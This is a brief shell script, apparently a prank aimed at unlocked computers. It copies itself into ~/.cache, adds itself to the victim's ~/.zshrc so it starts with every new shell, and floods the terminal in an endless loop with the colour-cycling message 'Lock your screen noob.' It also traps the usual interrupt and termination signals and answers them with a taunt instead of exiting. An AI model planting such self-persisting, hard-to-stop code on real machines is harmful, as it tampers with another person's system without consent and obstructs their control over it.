echo "$(cat $0)" > ~/.cache/coucou.sh
chmod a+rx ~/.cache/coucou.sh
echo "~/.cache/coucou.sh" >> ~/.zshrc

coucou="Lock your screen noob.";

trap 'clear ; echo "Oui... Mais non." ; sleep 2' 1 2 3 6 9 15
while [ 1 ]
do
		for i in {1..15} {17..231} {235..256}
				do
							echo "\x1b[7m\033[38;5;${i}m ${coucou} \033[0m\c"
								done
							done
